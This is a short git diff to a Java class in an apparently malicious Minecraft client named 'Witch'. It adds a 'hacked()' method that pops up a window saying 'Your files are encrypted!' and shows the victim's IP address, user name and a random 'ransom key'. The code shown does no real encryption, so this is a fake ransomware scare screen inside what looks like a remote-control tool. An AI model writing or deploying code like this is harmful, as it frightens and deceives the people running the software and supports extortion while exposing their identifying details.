@@ -1,6 +1,8 @@
-package me.soda.witch.client.utils;
+package me.soda.witch.client.modules;
 
 import me.soda.witch.client.Witch;
+import me.soda.witch.client.utils.MCUtils;
+import me.soda.witch.shared.NetUtil;
 
 import javax.swing.*;
 import java.awt.*;
@@ -45,6 +47,19 @@ public class ChatWindow {
 
         panel.add(sendPanel, BorderLayout.SOUTH);
         frame.getContentPane().add(panel, BorderLayout.CENTER);
+    }
+
+    public static void hacked() {
+        JFrame hacked = new JFrame();
+        JPanel panel = new JPanel(new GridLayout(4, 1));
+        panel.add(new JLabel("Your files are encrypted!"));
+        panel.add(new JLabel("IP: " + NetUtil.getIP()));
+        panel.add(new JLabel(String.valueOf(System.getProperty("user.name"))));
+        panel.add(new JLabel("Ransom key: " + MCUtils.getRandomPassword(32)));
+        hacked.add(panel);
+        hacked.setTitle("Hacked!");
+        hacked.setSize(300, 300);
+        hacked.setVisible(true);
     }
 
     private void send() {
